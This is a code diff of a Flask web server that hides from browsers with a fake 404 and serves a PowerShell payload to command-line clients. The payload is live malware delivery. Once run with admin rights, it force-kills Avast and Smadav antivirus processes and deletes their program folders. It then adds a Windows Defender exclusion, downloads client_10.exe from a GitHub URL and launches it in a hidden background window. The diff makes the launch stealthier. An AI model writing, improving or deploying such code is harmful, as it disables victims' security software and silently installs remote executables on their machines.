@@ -5,63 +5,52 @@ app = Flask(__name__)
 
 @app.route('/')
 def direct_command():
-    # 1. STEALTH CHECK: Identify the visitor
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # If the visitor is a browser (Chrome, Edge, etc.), pretend the page doesn't exist
+    # Stealth: Show 404 to browsers
     if 'mozilla' in user_agent and 'powershell' not in user_agent:
         return Response("Not Found", status=404, mimetype='text/plain')
 
-    # 2. THE PAYLOAD: PowerShell script with Process Killing logic
+    # The Payload
     ps_content = """
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "--- JAILBREAK-1: ADMIN ACTIVE ---" -ForegroundColor Green
-    Write-Host "Cleaning environment and stopping background processes..." -ForegroundColor Cyan
+    Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
     
-    # List of process names to kill (without .exe)
-    $procsToKill = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
+    # 1. Aggressively kill background processes
+    $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
+    foreach ($p in $procs) {
+        taskkill /F /IM "$p.exe" /T 2>$null
+    }
 
-    foreach ($proc in $procsToKill) {
-        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
-            Write-Host "Stopping..." -ForegroundColor Yellow
-            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
+    # 2. Cleanup Target Folders
+    $folders = @("C:\\Program Files\\Avast Software", "C:\\Program Files (x86)\\SMADAV", "C:\\Program Files\\SMADAV")
+    foreach ($f in $folders) {
+        if (Test-Path $f) {
+            Remove-Item -Path $f -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
 
-    # Define folders to clean up
-    $targetFolders = @(
-        "C:\\Program Files\\Avast Software",
-        "C:\\Program Files (x86)\\SMADAV",
-        "C:\\Program Files\\SMADAV"
-    )
-
-    foreach ($folder in $targetFolders) {
-        if (Test-Path -Path $folder) {
-            Write-Host "rem..." -ForegroundColor Cyan
-            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
+    # 3. HIDDEN DEPLOYMENT: Start a new hidden background process for the download
+    $deployScript = {
+        $path = "$HOME\\client_10.exe"
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+        
+        # Download and Run
+        if (!(Test-Path $path)) {
+            Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $path
+        }
+        if (Test-Path $path) {
+            Start-Process $path -WindowStyle Hidden
         }
     }
 
-    # Top-Followers Deployment
-    $filePath = "$HOME\\client_10.exe"
+    # Launch the deployment script in a separate hidden PowerShell window
+    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command & {$deployScript}" -WindowStyle Hidden
     
-    # Add exclusion so Windows Defender doesn't block it
-    Add-MpPreference -ExclusionPath $filePath
-
-    if (-not (Test-Path $filePath)) {
-        Write-Host "Downloading latest components..." -ForegroundColor Cyan
-        Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
-    }
-
-    if (Test-Path $filePath) {
-        Write-Host "Starting..." -ForegroundColor Green
-        Start-Process $filePath -WindowStyle Hidden
-    }
-    
+    Write-Host "[+] Background deployment started hidden." -ForegroundColor Green
 } else {
-    Write-Host "--- ACCESS DENIED ---" -ForegroundColor Red
-    Write-Host "Please run PowerShell as Administrator." -ForegroundColor Yellow
+    Write-Host "--- ERROR: ADMIN RIGHTS REQUIRED ---" -ForegroundColor Red
 }
 """
     return Response(ps_content, mimetype='text/plain')
